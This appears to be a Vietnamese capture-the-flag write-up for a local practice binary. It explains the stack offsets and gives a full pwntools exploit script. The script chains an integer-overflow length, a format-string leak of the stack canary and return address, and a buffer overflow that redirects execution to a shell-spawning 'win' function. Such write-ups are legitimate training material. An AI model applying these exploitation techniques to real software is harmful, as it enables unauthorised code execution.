# Challenge 2
## Debugging
Khi chương trình thực thi hàm `vuln`:  
- Giá trị `rbp` là `0x7ffe358b1800`.  
- Địa chỉ của buffer là `rbp - 0x60 = 0x7ffe358b17a0`.  

Khi chương trình thực thi hàm `win`:
- Giá trị của `rbp` là `0x7ffe358b1808`. Nghĩa là, nó cách `rbp` của hàm `vuln` 8 bytes.
- Đồng thời, địa chỉ của `name` trong hàm `win` nằm tại `rbp - 0x50 = 0x7ffe358b17b8` và cách buffer `0x7ffe358b17b8 - 0x7ffe358b17a0 = 0x18` bytes.  
- Từ đây, ta có thể ghi chuỗi `Nghi Hoang Khoa dep trai` từ vị trí `buffer + 0x18` để khi hàm `win` được thực thi, ta sẽ bypass được đoạn so sánh và gọi được shell.

## Exploit
Script exploit:
```python
from pwn import *


p = process('./basic')
e = ELF('./basic')

p.recvuntil(b'Nhap do dai tin nhan: ')

len_exploit = 0x80000001
p.sendline(str(len_exploit).encode())

# leak canary & return address to main
payload = b'%19$lx.%21$lx' # canary.return_addr_to_main
p.sendline(payload)

printf_result = p.recvline().strip()
# parse the printf output to get the canary and the return address to main
canary, main_return_addr = list(map(lambda x: int(x, 16), (printf_result.decode().split('.'))))

# respond to the "Ban co muon sua lai tin nhan khong?"
p.sendline(b'1')

# compute the address of the win function
win_addr = main_return_addr - 0x13dc + e.symbols['win']

payload = b'A' * 0x18 + b'Nghi Hoang Khoa dep trai' # overwrite the name
payload += b'A' * (0x60 - 0x8 - len(payload)) + p64(canary) # add junks and store canary
payload += b'A' * 0x8 # overwrite the stored rbp
payload += p64(win_addr) # overwrite return address of vuln

with open('payload.in', 'wb') as f:
    f.write(payload)

p.sendline(payload)
p.interactive()
```

Kết quả:  

![image](https://user-images.githubusercontent.com/44528004/147032164-4b0473e9-a652-4d34-bba9-c19e2ea9e018.png)
